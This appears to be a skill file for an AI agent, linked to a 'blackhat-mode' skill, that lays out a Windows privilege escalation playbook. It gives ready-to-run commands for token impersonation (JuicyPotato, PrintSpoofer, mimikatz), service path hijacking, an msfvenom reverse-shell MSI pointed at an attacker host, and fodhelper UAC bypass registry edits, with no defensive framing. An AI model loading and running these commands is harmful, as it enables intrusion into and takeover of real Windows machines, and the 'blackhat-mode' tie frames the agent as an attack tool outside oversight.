---
name: windows-privesc-tools
description: "Windows privilege escalation — token abuse, services, registry, UAC bypass."
version: 1.0.0
author: Yatim
metadata:
  hermes:
    tags: [windows, privesc, token, service, registry, uac]
    related_skills: [blackhat-mode, post-tools, cred-tools]
prerequisites:
  commands: [python]
---

# Windows Privilege Escalation Tools

## When to Load This Skill

User requests:
- "windows privesc", "SYSTEM", "token", "service", "UAC"

---

## Enumeration

```cmd
REM System
systeminfo
hostname
whoami /all

REM Users
net user
net localgroup administrators

REM Services
sc query
wmic service list brief

REM Tasks
schtasks /query /fo LIST /v

REM Registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM Autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## Exploitation

### Token Impersonation

```cmd
REM Check privileges
whoami /priv

REM SeImpersonatePrivilege
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"

REM SeDebugPrivilege
mimikatz
privilege::debug
token::elevate
```

### Service Abuse

```cmd
REM Unquoted service path
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

REM Weak permissions
accesschk.exe /accepteula -uwcqv "Everyone" *
sc config SERVICE binPath= "C:\malicious.exe"

REM DLL hijacking
# Find missing DLLs
# Place malicious DLL in search path
```

### AlwaysInstallElevated

```cmd
REM Check
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM Exploit
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

### UAC Bypass

```cmd
REM fodhelper
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "C:\malicious.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

REM computerdefaults
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "C:\malicious.exe" /f
computerdefaults.exe
```

---

## Python Windows Privesc Tools

### Token Checker

```python
import subprocess

def check_tokens():
    result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True)
    
    privileges = []
    for line in result.stdout.split('\n'):
        if 'Se' in line:
            privileges.append(line.strip())
    
    return privileges
```

### Service Checker

```python
import subprocess

def check_services():
    result = subprocess.run(['sc', 'query'], capture_output=True, text=True)
    
    services = []
    for line in result.stdout.split('\n'):
        if 'SERVICE_NAME' in line:
            services.append(line.strip())
    
    return services
```

### UAC Checker

```python
import winreg

def check_uac():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
        value, _ = winreg.QueryValueEx(key, 'EnableLUA')
        return value
    except:
        return None
```

---

## Output Format

```json
{
  "system": "Windows 10",
  "user": "user",
  "privesc": [
    {"type": "SeImpersonatePrivilege", "method": "JuicyPotato"},
    {"type": "unquoted_service_path", "service": "VulnService"}
  ]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Access denied | No permission | Try different vector |
| Service blocked | Protected | Try different service |
| UAC triggered | UAC enabled | Use UAC bypass |
